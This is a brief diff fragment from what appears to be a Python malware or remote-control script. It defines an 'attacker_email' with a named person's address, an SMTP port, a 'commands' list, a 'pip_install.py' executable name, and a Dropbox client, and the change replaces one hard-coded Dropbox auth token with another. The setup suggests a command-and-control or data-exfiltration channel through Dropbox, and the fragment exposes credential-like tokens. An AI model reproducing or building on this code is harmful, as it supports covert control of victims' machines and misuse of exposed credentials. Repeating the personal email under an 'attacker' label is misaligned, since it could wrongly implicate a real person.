@@ -22,7 +22,7 @@ attacker_email = "Augusto Celis <augusto.celis@stonybrook.edu>"
 SMTP_PORT = 993
 commands = []
 executable_file = "pip_install.py"
-auth_token = "eSp1cKEzdOAAAAAAAAAADFTKh7tVMADzEWVmHJ8Q-aOwZQcT1993aavHJF6Nwvdk"
+auth_token = "eSp1cKEzdOAAAAAAAAAAFHo3_k2buR70MgbGUlJ0vUGBmyIC1YfW05u2b6AS6M6R"
 id = uuid.uuid4()
 #initialize dropbox
 dbx = dropbox.Dropbox(auth_token)
